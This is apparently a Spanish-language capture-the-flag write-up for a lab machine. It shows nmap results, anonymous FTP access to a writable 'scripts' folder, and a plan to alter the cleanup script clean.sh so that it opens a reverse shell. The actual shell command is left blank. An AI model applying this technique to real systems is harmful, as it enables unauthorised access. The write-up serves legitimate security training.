### nmap
```python
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.157.7
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2024-01-20T21:35:30+00:00
|_clock-skew: mean: -28s, deviation: 0s, median: -28s
| smb2-time: 
|   date: 2024-01-20T21:35:30
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```
### Ports: 21/ftp - 22/ssh - 139/smb - 445/smb 

### Enumeracion del puerto 21/ftp
```python
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.157.7
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
```
este puerto tiene una configuracion de credenciales por defecto con el usuario anonymous y tambien podemos ver que tenemos permisos writable (escritura)

### ftp 
nos conectamos al puerto ftp con las credenciales de anonymous(default) en este caso tenemos una carpeta llamada scripts la cual contiene 3 archivos, usando mget * podemos descargar todos los archivos para poder verlos mejor en local
![[Pasted image 20240120174450.png]]

el archivo nmap.txt coresponde a nuestro archivo de escaneo y tenemos los 3 archivos que hemos conseguido en la maquina
![[Pasted image 20240120174740.png]]

el archivo to_do.txt es un mensaje que nos dicen que han desabilitado el login de anonymous y que esto no es una practica segura. el archivo clean.sh es un script en bash que realiza una limpieza en el directorio /tmp. debido a que tenemos permisos de escritura podriamos editar este script para optener una reverse shell
![[Pasted image 20240120175113.png]]

el archivo removed.files.log solo es una captura de la ejecusion del script sin embargo dice que no se encontro nungun archivo para eliminar
![[Pasted image 20240120175636.png]]

### Reverse shell
lo primero que vamos hacer sera editar el script.sh para agregar una reverse shell aregando el siguiente comando ``
![[Pasted image 20240120181957.png]]
